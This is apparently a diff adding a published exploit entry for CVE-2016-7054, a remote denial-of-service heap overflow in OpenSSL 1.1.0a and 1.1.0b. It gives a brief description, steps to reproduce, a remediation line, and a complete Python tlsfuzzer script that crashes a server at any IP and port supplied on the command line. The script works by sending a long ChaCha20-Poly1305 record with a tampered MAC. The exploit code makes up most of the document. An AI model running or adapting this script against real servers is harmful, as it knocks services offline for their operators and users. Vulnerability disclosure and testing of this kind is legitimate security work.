@@ -1,0 +1,123 @@
+# Exploit Title: OpenSSL 1.1.0a & 1.1.0b Heap Overflow Remote DOS vulnerability
+# Date: 11-12-2016
+# Software Link: https://www.openssl.org/source/old/1.1.0/
+# Exploit Author: Silverfox
+# Contact: http://twitter.com/___Silverfox___
+# Website: https://www.silverf0x00.com/
+# CVE: CVE-2016-7054
+# Category: Denial of Service
+# Type: Remote
+# Platform: Multiple
+
+1. Description
+   
+Remote unauthenticated user can negotiate ChaCha20-Poly1305 cipher suites and send a message of sufficient length with a bad MAC to trigger the vulnerable code to zero out the heap space and force the vulnerable OpenSSL instance to crash.
+
+https://blog.fortinet.com/2016/11/23/analysis-of-openssl-chacha20-poly1305-heap-buffer-overflow-cve-2016-7054 
+https://www.silverf0x00.com/overview-of-mac-algorithms-fuzzing-tls-and-finally-exploiting-cve-2016-7054-part-1/
+ 
+   
+2. Proof of Concept
+ 
+ a. Download and compile OpenSSL 1.1.0a or b
+ b. Run OpenSSL with the following switches: ./openssl-1.1.0a/bin/openssl s_server -cipher 'DHE-RSA-CHACHA20-POLY1305' -key cert.key -cert cert.crt -accept 443 -www -tls1_2 -msg
+ c. Download and run the exploit code (Under https://github.com/silverfoxy/tlsfuzzer package run test-cve-2016-7054.py at https://github.com/silverfoxy/tlsfuzzer/blob/master/scripts/test-cve-2016-7054.py)
+ d. OpenSSL Instance crashes causing DOS
+
+### Exploit Code ###
+'''
+ *  In no event shall the author be liable
+ *  for any direct, indirect, incidential, special, exemplary or
+ *  consequential damages, including, but not limited to, procurement
+ *  of substitute goods or services, loss of use, data or profits or
+ *  business interruption, however caused and on any theory of liability,
+ *  whether in contract, strict liability, or tort, including negligence
+ *  or otherwise, arising in any way out of the use of this software,
+ *  even if advised of the possibility of such damage.
+'''
+from __future__ import print_function
+import traceback
+import sys
+
+from tlsfuzzer.runner import Runner
+from tlsfuzzer.messages import Connect, ClientHelloGenerator, \
+        ClientKeyExchangeGenerator, ChangeCipherSpecGenerator, \
+        FinishedGenerator, ApplicationDataGenerator, \
+        fuzz_encrypted_message
+from tlsfuzzer.expect import ExpectServerHello, ExpectCertificate, \
+        ExpectServerHelloDone, ExpectChangeCipherSpec, ExpectFinished, \
+        ExpectAlert, ExpectClose, ExpectServerKeyExchange
+
+from tlslite.constants import CipherSuite, AlertLevel, AlertDescription
+
+def usage() :
+    return 'Usage ./{} Destination_IP Destination_Port'.format(sys.argv[0])
+
+def main():
+    if len(sys.argv) < 3:
+        print(usage())
+        return -1
+    conversations = {}
+    # 16 chars: POLY1305 tag 128 bit
+    # Tampering one bit suffices to damage the mac
+    # The payload has to be long enough to trigger heap overflow
+    n = 15000
+    fuzzes = [(-1, 1)]
+    for pos, val in fuzzes:
+        conversation = Connect(sys.argv[1], int(sys.argv[2]))
+        node = conversation
+        ciphers = [CipherSuite.TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256]
+        node = node.add_child(ClientHelloGenerator(ciphers))
+        node = node.add_child(ExpectServerHello())
+        node = node.add_child(ExpectCertificate())
+        node = node.add_child(ExpectServerKeyExchange())
+        node = node.add_child(ExpectServerHelloDone())
+        node = node.add_child(ClientKeyExchangeGenerator())
+        node = node.add_child(ChangeCipherSpecGenerator())
+        node = node.add_child(FinishedGenerator())
+        node = node.add_child(ExpectChangeCipherSpec())
+        node = node.add_child(ExpectFinished())
+        node = node.add_child(fuzz_encrypted_message(
+            ApplicationDataGenerator(b"GET / HTTP/1.0\n" + n * b"A" + b"\n\n"), xors={pos:val}))
+        node = node.add_child(ExpectAlert(AlertLevel.fatal,
+                                          AlertDescription.bad_record_mac))
+        node = node.add_child(ExpectClose())
+
+        conversations["XOR position " + str(pos) + " with " + str(hex(val))] = \
+                conversation
+
+    # run the conversation
+    good = 0
+    bad = 0
+
+    for conversation_name in conversations:
+        conversation = conversations[conversation_name]
+        #print(conversation_name + "...")
+        runner = Runner(conversation)
+        res = True
+        try:
+            runner.run()
+        except:
+            print("Error while processing")
+            print(traceback.format_exc())
+            res = False
+        if res:
+            good+=1
+            print("OK")
+        else:
+            bad+=1
+
+    print("Test end")
+    print("successful: {0}".format(good))
+    print("failed: {0}".format(bad))
+
+    if bad > 0:
+        sys.exit(1)
+
+if __name__ == "__main__":
+	main()
+### End of Exploit Code ###
+
+3. Solution:
+   
+Update OpenSSL to version 1.1.0c or later, versions earlier than 1.1.0a are not affected by this vulnerability.
